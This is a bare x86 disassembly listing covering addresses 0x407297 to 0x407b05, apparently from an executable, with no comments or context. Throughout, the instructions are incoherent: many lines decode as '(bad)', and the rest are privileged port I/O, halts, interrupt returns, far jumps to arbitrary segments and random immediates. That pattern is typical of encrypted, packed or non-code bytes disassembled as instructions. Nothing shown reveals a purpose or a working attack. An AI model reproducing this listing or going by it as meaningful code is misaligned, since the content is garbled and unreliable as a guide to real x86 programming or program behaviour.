  407297:	pop    es
  407298:	fidivr DWORD PTR [esi-0x180ffe0a]
  40729e:	stc    
  40729f:	mov    esp,0x12ef03d9
  4072a4:	test   eax,0xd2b7dec7
  4072a9:	iret   
  4072aa:	mov    bh,0xeb
  4072ac:	retf   
  4072ad:	jmp    0xd4205e88
  4072b2:	(bad)  
  4072b3:	out    dx,al
  4072b4:	in     eax,dx
  4072b5:	(bad)  
  4072b6:	iret   
  4072b7:	xlat   BYTE PTR ds:[ebx]
  4072b8:	lock out 0x5,eax
  4072bb:	jmp    0xffdc:0xe6fb03d5
  4072c2:	(bad)
  4072c5:	jmp    0x4072a5
  4072c7:	rol    ah,0xc5
  4072ca:	xlat   BYTE PTR ds:[ebx]
  4072cb:	shr    cl,0xae
  4072ce:	mov    ch,0xdf
  4072d0:	fidivr WORD PTR [esi-0x4032013]
  4072d6:	std    
  4072d7:	fptan  
  4072d9:	clc    
  4072da:	add    dl,cl
  4072dc:	add    dh,bh
  4072de:	fimul  DWORD PTR [ebx]
  4072e0:	stc    
  4072e1:	out    dx,al
  4072e2:	retf   0xe90e
  4072e5:	shr    esp,0xcf
  4072e8:	mov    dh,0xed
  4072ea:	mov    al,0xef
  4072ec:	in     eax,0xc9
  4072ee:	fcmovbe st,st(2)
  4072f0:	std    
  4072f1:	(bad)  
  4072f3:	iret   
  4072f4:	mov    edi,0xdbd3dcd6
  4072f9:	mov    al,0x7
  4072fc:	stc    
  4072fd:	xlat   BYTE PTR ds:[ebx]
  4072fe:	clc    
  4072ff:	(bad)  
  407300:	fdiv   st(2),st
  407302:	(bad)
  407305:	mov    cl,0xc2
  407307:	ret    
  407308:	in     al,dx
  407309:	rcr    ebx,1
  40730b:	mov    al,0xf0
  40730d:	leave  
  40730e:	iret   
  40730f:	mov    ecx,0xcedef4b6
  407314:	iret   
  407315:	add    BYTE PTR [ecx+esi*8-0x15232aff],bh
  40731c:	add    bh,dl
  40731e:	(bad)  
  40731f:	call   0xa3b3e13
  407324:	out    0xde,al
  407326:	mov    bh,0xc8
  407328:	call   0xb30766e1
  40732d:	out    dx,al
  40732e:	(bad)  
  407331:	mov    esi,0xc3d4b8e3
  407336:	shl    bl,0xe0
  407339:	hlt    
  40733a:	mul    esp
  40733c:	leave  
  40733d:	fadd   st,st(0)
  40733f:	add    al,0xf5
  407341:	loopne 0x407331
  407343:	out    0xd1,eax
  407345:	mov    esi,0xb5b1ebd1
  40734b:	iret   
  40734c:	leave  
  40734d:	in     al,dx
  40734e:	aam    0xf0
  407350:	hlt    
  407351:	fnstsw WORD PTR [eax-0x4128242f]
  407357:	fdivr  st,st(3)
  407359:	add    cl,dh
  40735b:	lds    ecx,FWORD PTR [ecx]
  40735d:	fiadd  WORD PTR [esi]
  40735f:	in     al,0xcf
  407361:	int    0xe5
  407363:	out    dx,al
  407364:	shr    DWORD PTR [edi-0x41a4911],cl
  40736a:	icebp  
  40736b:	jmp    0xd3f14922
  407370:	(bad)  
  407371:	call   0x395e42
  407376:	aam    0xbc
  407378:	rol    BYTE PTR [edi],1
  40737a:	rcr    dl,0xc6
  40737d:	or     ecx,eax
  40737f:	fsubp  st(2),st
  407381:	fdivrp st(3),st
  407383:	repnz stos BYTE PTR es:[edi],al
  407385:	mov    edi,0xc8f7dec2
  40738a:	(bad)
  40738d:	sar    cl,cl
  40738f:	call   0xb9444766
  407394:	in     eax,dx
  407395:	mov    eax,0xc4e7c3fa
  40739a:	rol    cl,1
  40739c:	add    al,al
  40739e:	loopne 0x4073a6
  4073a0:	cld    
  4073a1:	jmp    0x40739d
  4073a3:	add    al,0xbc
  4073a5:	in     eax,dx
  4073a6:	out    dx,al
  4073a7:	mov    bl,0xcc
  4073a9:	xlat   BYTE PTR ds:[ebx]
  4073aa:	cmc    
  4073ab:	in     al,dx
  4073ac:	leave  
  4073ad:	repz sar edi,cl
  4073b0:	iret   
  4073b1:	enter  0xdcd0,0xc8
  4073b5:	add    ebx,edx
  4073b7:	(bad)  
  4073b9:	ret    
  4073ba:	mov    ecx,0x2eaf8c1
  4073bf:	aam    0xe4
  4073c1:	or     eax,0xe5eefd12
  4073c6:	out    0xc4,eax
  4073c8:	loopne 0x40738a
  4073ca:	in     al,0xe4
  4073cc:	enter  0xcdfb,0xf1
  4073d0:	hlt    
  4073d1:	in     eax,dx
  4073d2:	mov    edi,0xf3b6e1b0
  4073d7:	int3   
  4073d8:	out    0xf8,al
  4073da:	loope  0x4073ce
  4073dc:	in     eax,0xff
  4073de:	xlat   BYTE PTR ds:[ebx]
  4073df:	std    
  4073e0:	fadd   QWORD PTR [ecx]
  4073e2:	out    0xcd,al
  4073e4:	shr    ch,1
  4073e6:	jmp    0xfb174bcc
  4073eb:	jmp    0xef096aea
  4073f0:	repz fstp st(6)
  4073f3:	int    0xfd
  4073f5:	ret    
  4073f6:	out    dx,al
  4073f7:	rol    dh,cl
  4073f9:	(bad)  
  4073fa:	jecxz  0x4073f4
  4073fc:	ret    
  4073fd:	hlt    
  4073fe:	add    ecx,edi
  407400:	in     al,dx
  407401:	or     bh,ch
  407403:	jmp    0xf3ea:0xdccadff1
  40740a:	xlat   BYTE PTR ds:[ebx]
  40740b:	test   ebp,0xbfcad1e9
  407411:	retf   0xfade
  407414:	cli    
  407415:	add    ebp,esi
  407417:	not    esi
  407419:	shl    edx,cl
  40741b:	or     edi,ebp
  40741d:	add    eax,0xc800fce4
  407422:	out    dx,al
  407423:	loop   0x4073d8
  407425:	scas   al,BYTE PTR es:[edi]
  407426:	scas   eax,DWORD PTR es:[edi]
  407427:	cmc    
  407428:	loopne 0x4073f0
  40742a:	ret    
  40742b:	lock fcmovnbe st,st(4)
  40742e:	in     eax,dx
  40742f:	into   
  407430:	mov    bh,0xcb
  407432:	(bad)  
  407433:	cli    
  407434:	(bad)  
  407436:	(bad)  
  407437:	cld    
  407438:	ret    0xf1cc
  40743b:	(bad)  
  40743d:	jmp    0x41e6311
  407442:	in     al,0xd2
  407444:	(bad)  
  407445:	repnz (bad) 
  407447:	test   al,0xb7
  407449:	lods   eax,DWORD PTR ds:[esi]
  40744a:	mov    ch,0xc9
  40744c:	in     eax,dx
  40744d:	in     eax,0xe9
  40744f:	icebp  
  407450:	neg    bl
  407452:	cld    
  407453:	fistp  QWORD PTR [eax+0x7fef0e8]
  407459:	(bad)
  40745d:	enter  0xcedc,0xdc
  407461:	pop    es
  407462:	lds    ecx,FWORD PTR [ecx]
  407464:	iret   
  407465:	in     al,0xe2
  407467:	scas   eax,DWORD PTR es:[edi]
  407468:	mov    esp,0xafb4c9e0
  40746d:	int    0xd1
  40746f:	in     eax,dx
  407470:	mov    bh,0xfa
  407472:	int3   
  407473:	mov    esi,0xcceebef9
  407478:	loope  0x407475
  40747a:	add    edi,ebx
  40747c:	(bad)  
  40747d:	(bad)  
  40747e:	fsubp  st(1),st
  407480:	into   
  407481:	add    al,0xed
  407483:	in     eax,0xa9
  407485:	fsub   st,st(0)
  407487:	(bad)  
  407488:	mov    ch,0xae
  40748a:	mov    bh,0xdb
  40748c:	out    0xfb,al
  40748e:	lods   eax,DWORD PTR ds:[esi]
  40748f:	std    
  407490:	enter  0x3d5,0x3
  407494:	int3   
  407495:	call   ebx
  407497:	(bad)  
  407499:	(bad)  
  40749b:	jmp    0xd4ff:0xeedbc4e6
  4074a2:	bswap  ebx
  4074a4:	(bad)  
  4074a5:	retf   0xf2cd
  4074a8:	mul    ch
  4074aa:	test   dh,0xf1
  4074ad:	mov    ah,0xf9
  4074af:	out    dx,eax
  4074b0:	retf   0xb8f1
  4074b3:	retf   0xc3cc
  4074b6:	ret    
  4074b7:	cmc    
  4074b8:	aad    0xcc
  4074ba:	ret    0xb
  4074bd:	stc    
  4074be:	fadd   QWORD PTR [edi+edi*8]
  4074c1:	add    eax,0xc2c9f20b
  4074c6:	ret    
  4074c7:	call   0xef3c2791
  4074cc:	xlat   BYTE PTR ds:[ebx]
  4074cd:	iret   
  4074ce:	mov    edx,0xcfb4d1f4
  4074d3:	xlat   BYTE PTR ds:[ebx]
  4074d4:	ret    0xdac0
  4074d7:	cli    
  4074d8:	fdiv   st,st(7)
  4074da:	vpsubusb xmm0,xmm2,xmm1
  4074de:	retf   
  4074df:	add    esp,edi
  4074e1:	loopne 0x4074bb
  4074e3:	shl    al,0xad
  4074e6:	loopne 0x4074d5
  4074e8:	(bad)  
  4074e9:	mov    bh,0xc1
  4074eb:	call   0xe91964e5
  4074f0:	cld    
  4074f1:	cmc    
  4074f2:	out    dx,eax
  4074f3:	sti    
  4074f4:	cld    
  4074f5:	add    ebx,edx
  4074f7:	loope  0x4074f5
  4074f9:	cld    
  4074fa:	add    al,0xf8
  4074fc:	fdiv   st,st(5)
  4074fe:	fucomip st,st(0)
  407500:	fsubp  st(0),st
  407502:	cld    
  407503:	pop    es
  407504:	out    0xe3,eax
  407506:	jecxz  0x4074f8
  407508:	hlt    
  407509:	iret   
  40750a:	aam    0xba
  40750c:	clc    
  40750d:	repnz repz mov ch,0xcb
  407511:	int    0xf2
  407513:	cld    
  407514:	mov    ebp,0xf2d3e3ce
  407519:	mov    esp,0xe6ddf7c5
  40751e:	or     cl,ah
  407520:	in     eax,0xdf
  407522:	call   0xb0025b26
  407527:	loopne 0x4074d8
  407529:	(bad)  
  40752a:	out    dx,eax
  40752b:	in     al,dx
  40752c:	(bad)  
  40752d:	ror    eax,1
  40752f:	retf   0xf2f9
  407532:	mov    esp,0xc7dde1c3
  407537:	mov    eax,0xe1e6c0e0
  40753c:	(bad)  
  40753e:	add    dl,ah
  407540:	loopne 0x40750d
  407542:	retf   0xd9e6
  407545:	into   
  407546:	lods   eax,DWORD PTR ds:[esi]
  407547:	jmp    0x407518
  407549:	jmp    0x40751b
  40754b:	mov    ebx,0xcafff0f8
  407550:	aam    0xd4
  407552:	into   
  407553:	mov    esi,0x3e1f2fc
  407558:	xlat   BYTE PTR ds:[ebx]
  407559:	cld    
  40755a:	repz inc bl
  40755d:	retf   0xd6c4
  407560:	jecxz  0x407556
  407562:	add    esi,ecx
  407564:	retf   
  407565:	shr    edx,cl
  407567:	scas   al,BYTE PTR es:[edi]
  407568:	mov    dl,0xf6
  40756a:	out    dx,eax
  40756b:	lods   al,BYTE PTR ds:[esi]
  40756c:	mov    ecx,0xd4c5d7b4
  407571:	(bad)  
  407573:	(bad)  
  407575:	iret   
  407576:	(bad)  
  407577:	(bad)  
  407578:	fnstcw WORD PTR [esp+eax*1-0x251802fa]
  40757f:	mov    esp,0xcccae1f4
  407584:	into   
  407585:	jecxz  0x40756c
  407587:	fst    st(6)
  407589:	retf   0xb1fa
  40758c:	fcmovnbe st,st(1)
  40758e:	ffreep st(5)
  407590:	mov    ebx,0xf7d1d5f5
  407595:	cld    
  407596:	repnz test edx,0xc4c6c4fa
  40759d:	dec    DWORD PTR [edx]
  40759f:	rcl    ah,0xe9
  4075a2:	or     al,0x12
  4075a4:	into   
  4075a5:	(bad)  
  4075a6:	in     eax,dx
  4075a7:	in     al,dx
  4075a8:	rol    dl,cl
  4075aa:	mov    al,0xb7
  4075ac:	out    0xb8,al
  4075ae:	rcl    esi,1
  4075b0:	in     al,dx
  4075b1:	int    0xcd
  4075b3:	retf   0xfbe9
  4075b6:	out    dx,eax
  4075b7:	loopne 0x407595
  4075b9:	shl    bh,1
  4075bb:	div    dh
  4075bd:	loop   0x407599
  4075bf:	out    dx,eax
  4075c0:	(bad)  
  4075c2:	paddb  mm5,QWORD PTR [ebp-0x3236101a]
  4075c9:	shl    DWORD PTR [edi-0x33374e2f],1
  4075cf:	rcl    ebp,cl
  4075d1:	imul   ecx
  4075d3:	in     al,dx
  4075d4:	repnz rol BYTE PTR [ebx],cl
  4075d7:	fdivrp st(1),st
  4075d9:	shl    ch,1
  4075db:	fcomip st,st(4)
  4075dd:	mov    DWORD PTR [esi],0xe30cffe7
  4075e3:	fsubr  st,st(4)
  4075e5:	out    0xb7,al
  4075e7:	icebp  
  4075e8:	loopne 0x40759f
  4075ea:	mov    al,0xdb
  4075ec:	cmc    
  4075ed:	(bad)  
  4075ef:	aad    0xc9
  4075f1:	(bad)  
  4075f2:	(bad)  
  4075f4:	in     al,dx
  4075f5:	stc    
  4075f6:	aad    0x6
  4075f8:	rol    DWORD PTR [eax+eiz*8],0x5
  4075fc:	or     eax,edx
  4075fe:	cli    
  4075ff:	add    ecx,edx
  407601:	fstp   st(4)
  407603:	rsm    
  407605:	mov    esp,0xb5b1debd
  40760a:	retf   0xe5f6
  40760d:	cli    
  40760e:	fcomi  st,st(5)
  407610:	hlt    
  407611:	xlat   BYTE PTR ds:[ebx]
  407612:	int    0xc2
  407614:	add    dh,bl
  407616:	out    0xc2,al
  407618:	add    al,0xd5
  40761a:	in     al,0xe2
  40761c:	add    ah,ah
  40761e:	add    bh,dl
  407620:	out    0xde,eax
  407622:	loop   0x40761c
  407624:	(bad)  
  407626:	leave  
  407627:	fdivr  st(4),st
  407629:	leave  
  40762a:	shr    cl,1
  40762c:	mov    edx,0xbdcbb8c5
  407631:	enter  0xf1f1,0xb7
  407635:	pop    es
  407636:	icebp  
  407637:	cmc    
  407638:	fcmovu st,st(0)
  40763a:	add    al,0xbc
  40763c:	ror    DWORD PTR [ecx],0xbd
  40763f:	clc    
  407640:	jmp    0x407610
  407642:	pop    es
  407643:	or     dh,al
  407645:	scas   al,BYTE PTR es:[edi]
  407646:	jecxz  0x407637
  407648:	out    0xc3,eax
  40764a:	jmp    0x407610
  40764c:	enter  0xe9d6,0xee
  407650:	mov    ecx,0xc2c3f3d3
  407655:	(bad)  
  407656:	repz in eax,dx
  407658:	(bad)  
  40765a:	les    eax,FWORD PTR [eax]
  40765c:	add    ah,bl
  40765e:	(bad)  
  40765f:	out    dx,al
  407660:	jmp    0xace3:0xa9f9130a
  407667:	into   
  407668:	(bad)  
  40766a:	lock icebp 
  40766c:	in     eax,dx
  40766d:	loopne 0x40763b
  40766f:	repz fpatan 
  407672:	mov    eax,0xbf07bcf8
  407677:	aad    0xf2
  407679:	fadd   st(0),st
  40767b:	not    ebp
  40767d:	add    cl,BYTE PTR [edi]
  40767f:	jecxz  0x407661
  407681:	out    dx,eax
  407682:	(bad)
  407685:	loopne 0x40764d
  407687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407688:	loopne 0x407671
  40768a:	(bad)  
  40768c:	jmp    0xf9f53677
  407691:	jmp    0xf6c0:0xbeb7cdbc
  407698:	loopne 0x40767d
  40769a:	cli    
  40769b:	aam    0xfa
  40769d:	in     al,0xe1
  40769f:	in     al,0xe8
  4076a1:	leave  
  4076a2:	fsubp  st(2),st
  4076a4:	ret    
  4076a5:	imul   DWORD PTR [esi+eax*8-0x24154910]
  4076ac:	mov    dl,0xef
  4076ae:	(bad)  
  4076af:	mov    dh,0xbd
  4076b1:	fcomp  st(4)
  4076b3:	repz cld 
  4076b5:	loop   0x407692
  4076b7:	loope  0x4076ba
  4076b9:	cmc    
  4076ba:	shl    dl,cl
  4076bc:	add    esi,ebp
  4076be:	out    0xc7,eax
  4076c0:	push   cs
  4076c1:	in     eax,0xc5
  4076c3:	shl    DWORD PTR [ebx-0x5153091d],cl
  4076c9:	mov    ch,0xf5
  4076cb:	(bad)
  4076ce:	idiv   BYTE PTR [ebx-0x46130928]
  4076d4:	mov    edx,0xc2dae6ce
  4076d9:	add    eax,0xeb06fc04
  4076de:	or     ebp,esp
  4076e0:	pop    es
  4076e1:	ffreep st(5)
  4076e3:	iret   
  4076e4:	test   eax,0xe6f1dead
  4076e9:	iret   
  4076ea:	cli    
  4076eb:	int3   
  4076ec:	(bad)  
  4076ed:	fcmovne st,st(5)
  4076ef:	shl    edi,1
  4076f1:	stc    
  4076f2:	mov    ah,0xf0
  4076f4:	hlt    
  4076f5:	iret   
  4076f6:	icebp  
  4076f7:	rcr    cl,0xba
  4076fa:	rcl    dh,0xfc
  4076fd:	cmc    
  4076fe:	(bad)  
  407700:	in     eax,dx
  407701:	inc    esp
  407703:	adc    cl,dl
  407705:	(bad)  
  407706:	retf   0xe9d6
  407709:	mov    cl,0xf7
  40770b:	retf   0xbad1
  40770e:	aad    0xec
  407710:	mov    ebx,0xf9cf03d9
  407715:	out    dx,eax
  407716:	pop    es
  407717:	add    eax,0x7dfe606
  40771c:	loopne 0x4076fe
  40771e:	loope  0x407728
  407720:	aam    0x13
  407722:	in     eax,0xe2
  407724:	lods   eax,DWORD PTR ds:[esi]
  407725:	scas   eax,DWORD PTR es:[edi]
  407726:	lock mov ebp,0xf6e3c3d6
  40772c:	clc    
  40772d:	out    dx,al
  40772e:	div    dh
  407730:	in     al,dx
  407731:	mov    edx,0xd0c9c3ff
  407736:	add    DWORD PTR [eax],eax
  407738:	repz mov ebp,0xd7ca0b06
  40773e:	psubq  mm2,mm5
  407741:	repz in al,0xee
  407744:	test   eax,0xe0c7dfc5
  407749:	sti    
  40774a:	lods   al,BYTE PTR ds:[esi]
  40774b:	in     al,0xee
  40774d:	fbstp  TBYTE PTR [eax-0x2d063a3c]
  407753:	(bad)  
  407754:	fcomip st,st(3)
  407756:	mov    esp,0xc3f6f7fb
  40775b:	add    al,0xd5
  40775d:	fmul   st,st(3)
  40775f:	push   cs
  407760:	fsubp  st(0),st
  407762:	clc    
  407763:	or     al,cl
  407765:	ror    dh,cl
  407767:	ret    0xe8ef
  40776a:	mov    bl,0xcc
  40776c:	in     al,dx
  40776d:	xlat   BYTE PTR ds:[ebx]
  40776e:	in     eax,dx
  40776f:	(bad)
  407772:	mov    esp,0xd6e8de
  407777:	shl    al,1
  407779:	stc    
  40777a:	add    edi,esi
  40777c:	ret    0xae6
  40777f:	shr    ah,0xed
  407782:	(bad)  
  407783:	retf   0xf0ab
  407786:	repnz sar BYTE PTR [esp+ecx*8-0x4f4e4e0d],0xe4
  40778f:	shl    al,1
  407791:	fsubr  st,st(0)
  407793:	stc    
  407794:	clc    
  407795:	(bad)  
  407796:	loop   0x40777f
  407798:	lock icebp 
  40779a:	mov    esp,0xd600c2ca
  40779f:	fiadd  WORD PTR ds:0xc40bc906
  4077a5:	mov    dl,0xe3
  4077a7:	jecxz  0x407777
  4077a9:	mov    ah,0xe2
  4077ab:	enter  0xdaea,0xeb
  4077af:	in     al,dx
  4077b0:	iret   
  4077b1:	repz mov edi,0xfee0fef9
  4077b7:	mov    edi,0xd0d4fef4
  4077bc:	aad    0xc8
  4077be:	or     esi,ebp
  4077c0:	(bad)
  4077c3:	loopne 0x407787
  4077c5:	test   eax,0xe5adcaf6
  4077ca:	jmp    0xbbf76f80
  4077cf:	mov    ah,0xde
  4077d1:	in     al,dx
  4077d2:	mov    ch,0xb0
  4077d4:	sar    edi,0xd2
  4077d7:	mov    esi,0xc706f6f4
  4077dc:	icebp  
  4077dd:	push   es
  4077de:	retf   
  4077df:	add    eax,0xe2ff03
  4077e4:	call   0xf10f37b4
  4077e9:	hlt    
  4077ea:	iret   
  4077eb:	(bad)  
  4077ec:	stc    
  4077ed:	cli    
  4077ee:	(bad)  
  4077ef:	iret   
  4077f0:	jmp    0x4077c7
  4077f2:	lock add eax,ecx
  4077f5:	into   
  4077f6:	jmp    ecx
  4077f8:	fucomp st(3)
  4077fa:	(bad)  
  4077fc:	hlt    
  4077fd:	cmc    
  4077fe:	idiv   bl
  407800:	(bad)  
  407802:	retf   
  407803:	stc    
  407804:	in     al,dx
  407805:	jmp    0xd6e6:0xf2d6beac
  40780c:	leave  
  40780d:	iret   
  40780e:	hlt    
  40780f:	fsubp  st(5),st
  407811:	clc    
  407812:	(bad)  
  407813:	in     al,dx
  407814:	cmc    
  407815:	aad    0xdc
  407817:	int    0xcd
  407819:	lock loopne 0x4077fc
  40781c:	hlt    
  40781d:	jmp    0xeddb:0xefc304cb
  407824:	lods   eax,DWORD PTR ds:[esi]
  407825:	iret   
  407826:	rcr    esp,0xe8
  407829:	(bad)  
  40782a:	in     eax,0xc1
  40782c:	retf   
  40782d:	retf   
  40782e:	lock (bad) 
  407830:	lock mov ebx,0xdf02b9d0
  407836:	rol    DWORD PTR [edi],1
  407838:	lock ret 0xd2d7
  40783c:	fdivrp st(0),st
  40783e:	retf   0xecc7
  407841:	iret   
  407842:	fsubrp st(5),st
  407844:	mov    esp,0xdcdddda6
  407849:	mov    bl,0xe9
  40784b:	(bad)
  40784e:	aam    0xcb
  407850:	clc    
  407851:	idiv   ah
  407853:	loop   0x407845
  407855:	add    dh,al
  407857:	add    cl,bh
  407859:	jmp    0x40784e
  40785b:	fdiv   st(6),st
  40785d:	test   bl,0x7
  407860:	fisttp DWORD PTR [edx+esi*8]
  407863:	adc    ebx,eax
  407865:	(bad)
  407868:	in     eax,dx
  407869:	fld    TBYTE PTR [ebp-0x61a452d]
  40786f:	std    
  407870:	rcr    edi,cl
  407872:	int3   
  407873:	fdivr  st(1),st
  407875:	out    dx,al
  407876:	ret    0xf103
  407879:	fmul   DWORD PTR [edx]
  40787b:	jmp    0x70c3a62
  407880:	(bad)
  407883:	retf   
  407884:	lods   eax,DWORD PTR ds:[esi]
  407885:	in     al,dx
  407886:	(bad)  
  407887:	scas   eax,DWORD PTR es:[edi]
  407888:	shl    edi,1
  40788a:	jmp    0xd6bf:0xf5f2d8f6
  407891:	repnz rol DWORD PTR [ecx],cl
  407894:	mov    esp,0xd9f3efd9
  407899:	mov    esp,0xffe7f4d9
  40789e:	loop   0x40788d
  4078a0:	into   
  4078a1:	retf   
  4078a2:	(bad)  
  4078a3:	fistp  QWORD PTR [ebp+ecx*8-0x3f3a4e1e]
  4078aa:	mov    bh,0xc4
  4078ac:	fcmovbe st,st(4)
  4078ae:	(bad)  
  4078b0:	iret   
  4078b1:	shl    ch,cl
  4078b3:	rcl    eax,cl
  4078b5:	repz fld QWORD PTR [ebx]
  4078b8:	repz cmc 
  4078ba:	fld    DWORD PTR [ecx]
  4078bc:	add    al,0x5
  4078be:	bswap  edx
  4078c0:	or     BYTE PTR [edi],cl
  4078c2:	sti    
  4078c3:	add    eax,0xc5bff0ce
  4078c8:	out    dx,al
  4078c9:	mov    bh,0xd7
  4078cb:	out    0xda,eax
  4078cd:	(bad)  
  4078ce:	in     al,dx
  4078cf:	idiv   DWORD PTR [eax-0x332d274b]
  4078d5:	std    
  4078d6:	into   
  4078d7:	sar    DWORD PTR [ebx+ebx*8-0xf044000],0x9
  4078df:	push   cs
  4078e0:	add    edi,esi
  4078e2:	fimul  WORD PTR [eax]
  4078e4:	rol    ebp,1
  4078e6:	mov    dl,0xce
  4078e8:	vpaddsb xmm0,xmm7,xmm5
  4078ec:	aam    0xe7
  4078ee:	mov    ch,0xb7
  4078f0:	retf   
  4078f1:	jecxz  0x4078c8
  4078f3:	push   ebx
  4078f5:	cmc    
  4078f6:	mov    ebp,0xe6c1ccdd
  4078fb:	fcomp  st(6)
  4078fd:	(bad)  
  4078ff:	into   
  407900:	(bad)  
  407901:	fstp   st(0)
  407903:	out    0xa8,al
  407905:	lock out dx,eax
  407907:	icebp  
  407908:	in     eax,0xb4
  40790a:	out    dx,eax
  40790b:	repz leave 
  40790d:	mov    ecx,0xd3d9bedf
  407912:	mov    ecx,0xde07d5e1
  407917:	sar    edi,0xd7
  40791a:	fdivrp st(4),st
  40791c:	or     cl,cl
  40791e:	fninit 
  407920:	call   0xe9215404
  407925:	(bad)  
  407926:	iret   
  407927:	jecxz  0x4078d5
  407929:	mov    esp,0xf8c0c1ef
  40792e:	out    0xf8,al
  407930:	std    
  407931:	in     al,0xd3
  407933:	fucomi st,st(1)
  407935:	rol    eax,1
  407937:	in     eax,0xfb
  407939:	fld    st(1)
  40793b:	std    
  40793c:	jmp    0x72b5724
  407941:	bswap  ebx
  407943:	loopne 0x40790b
  407945:	jecxz  0x407931
  407947:	mov    bh,0xed
  407949:	ret    
  40794a:	mov    ch,0xb0
  40794c:	aad    0xe0
  40794e:	retf   
  40794f:	iret   
  407950:	inc    DWORD PTR [ebx]
  407952:	into   
  407953:	shl    BYTE PTR [edi-0x2a054640],cl
  407959:	ret    
  40795a:	or     eax,ebx
  40795c:	ret    
  40795d:	add    bl,cl
  40795f:	(bad)  
  407961:	(bad)  
  407962:	push   cs
  407963:	iret   
  407964:	mov    ebp,0xf6f0dde6
  407969:	in     eax,0xc8
  40796b:	fcmovb st,st(5)
  40796d:	mov    cl,0xbf
  40796f:	fsub   st,st(5)
  407971:	mov    eax,0xf0fbb4ea
  407976:	into   
  407977:	add    eax,0xe6e1e0cc
  40797c:	jmp    0xebef:0xdde2c0c2
  407983:	retf   0xeab3
  407986:	iret   
  407987:	lds    ebp,FWORD PTR [ebp-0x360d241f]
  40798d:	iret   
  40798e:	fnsetpm(287 only) 
  407990:	in     al,0xe9
  407992:	leave  
  407993:	add    esp,ebp
  407995:	cmc    
  407996:	ret    0xd7df
  407999:	or     edi,ecx
  40799b:	push   es
  40799c:	ret    0xf506
  40799f:	shr    bl,0xe2
  4079a2:	leave  
  4079a3:	jmp    esp
  4079a5:	jmp    0xb6da:0xdcb3f5cb
  4079ac:	out    0xc4,al
  4079ae:	cli    
  4079af:	call   0xc4047599
  4079b4:	leave  
  4079b5:	rol    eax,cl
  4079b7:	fsubrp st(1),st
  4079b9:	ret    
  4079ba:	mov    ebp,0xc1d6d5c2
  4079bf:	jmp    0x5483fa5
  4079c4:	mov    esp,0xf1bde1e9
  4079c9:	loope  0x407982
  4079cb:	lock in al,0xb8
  4079ce:	lock call 0xb112799d
  4079d4:	lock in eax,dx
  4079d6:	mov    esp,0xf0c2e607
  4079db:	ret    0xf6c6
  4079de:	out    0x2,eax
  4079e0:	(bad)  
  4079e1:	clc    
  4079e2:	into   
  4079e3:	(bad)  
  4079e4:	iret   
  4079e5:	stos   BYTE PTR es:[edi],al
  4079e6:	out    0xe9,eax
  4079e8:	repz mov bh,0xe0
  4079eb:	call   0xc93640b0
  4079f0:	jmp    0xfec0:0xf3f7e8bb
  4079f7:	out    dx,al
  4079f8:	(bad)
  4079fb:	out    0xf4,al
  4079fd:	aad    0xd4
  4079ff:	add    eax,ebp
  407a01:	call   0xad1368cf
  407a06:	in     al,dx
  407a07:	lock mov bl,0xf4
  407a0a:	call   0xed164fd3
  407a0f:	div    bh
  407a11:	cli    
  407a12:	int    0xfe
  407a14:	jecxz  0x4079d9
  407a16:	(bad)  
  407a18:	out    0x4,eax
  407a1a:	or     ebx,edi
  407a1c:	(bad)  
  407a1d:	jmp    0xc8ea:0xfbe50ec4
  407a24:	jmp    0x4079cf
  407a26:	lock icebp 
  407a28:	fdivr  st(3),st
  407a2a:	loop   0x4079ec
  407a2c:	out    dx,al
  407a2d:	sti    
  407a2e:	into   
  407a2f:	in     eax,dx
  407a30:	aam    0xb9
  407a32:	jmp    0x407a15
  407a34:	enter  0xbeee,0xc0
  407a38:	sti    
  407a39:	(bad)  
  407a3b:	rcl    esi,0xf4
  407a3e:	retf   
  407a3f:	mov    esp,0xcffdc09
  407a44:	fdivr  DWORD PTR [eax-0x913123d]
  407a4a:	rcl    eax,cl
  407a4c:	repz (bad) 
  407a4e:	(bad)  
  407a4f:	stc    
  407a50:	fnstenv [ebp-0x1172143]
  407a56:	(bad)  
  407a57:	mov    eax,0xf205dcbd
  407a5c:	icebp  
  407a5d:	psubw  mm7,mm3
  407a60:	add    al,dh
  407a62:	or     al,0xc8
  407a64:	lods   eax,DWORD PTR ds:[esi]
  407a65:	repz mov ah,0xb0
  407a69:	div    DWORD PTR [esi-0x431101a]
  407a6f:	mov    bh,0xdf
  407a71:	clc    
  407a72:	repnz sti 
  407a74:	int3   
  407a75:	int    0xbc
  407a77:	rol    DWORD PTR [ebx],cl
  407a79:	hlt    
  407a7a:	shl    ebp,cl
  407a7c:	hlt    
  407a7d:	leave  
  407a7e:	out    0xf6,al
  407a80:	hlt    
  407a81:	fmul   QWORD PTR [edi]
  407a83:	int    0xe0
  407a85:	(bad)  
  407a87:	icebp  
  407a88:	mov    dl,0xb2
  407a8a:	int3   
  407a8b:	rol    ecx,cl
  407a8d:	shl    BYTE PTR [esi-0x312a412d],cl
  407a93:	fmul   st(1),st
  407a95:	cld    
  407a96:	mov    esi,0x2fcd1f1
  407a9b:	out    0xfd,eax
  407a9d:	cli    
  407a9e:	stc    
  407a9f:	jmp    0xbeb9:0xdcf2c202
  407aa6:	(bad)  
  407aa7:	mov    cl,0xd5
  407aa9:	stos   BYTE PTR es:[edi],al
  407aaa:	fcmove st,st(4)
  407aac:	repz ror ecx,1
  407aaf:	fistp  QWORD PTR [esi-0x8210e45]
  407ab5:	ffreep st(0)
  407ab7:	mov    ah,0xc6
  407ab9:	ret    0xc3e5
  407abc:	mov    eax,0xeacb0fe0
  407ac2:	repnz clc 
  407ac4:	in     al,dx
  407ac5:	out    dx,eax
  407ac6:	scas   al,BYTE PTR es:[edi]
  407ac7:	in     al,dx
  407ac8:	ret    0xd2ed
  407acb:	in     al,dx
  407acc:	les    esi,FWORD PTR [eax-0x4b0e3b]
  407ad2:	in     eax,dx
  407ad3:	icebp  
  407ad4:	fdivrp st(6),st
  407ad6:	aam    0xce
  407ad8:	aad    0xe0
  407ada:	add    al,0x1
  407adc:	jecxz  0x407ac7
  407ade:	or     bh,cl
  407ae0:	add    eax,0xf3d9eae1
  407ae5:	xlat   BYTE PTR ds:[ebx]
  407ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ae7:	jmp    0xcce5:0xe4e2b7f0
  407aee:	mov    ah,0xc6
  407af0:	into   
  407af1:	les    edi,FWORD PTR [ebp+0x2c8bee8]
  407af7:	add    BYTE PTR [ebx],al
  407af9:	aad    0xdb
  407afb:	or     esi,ecx
  407afd:	or     dh,bh
  407aff:	enter  0x6e6,0xfe
  407b03:	loope  0x407ac7
  407b05:	rcl    esi,cl
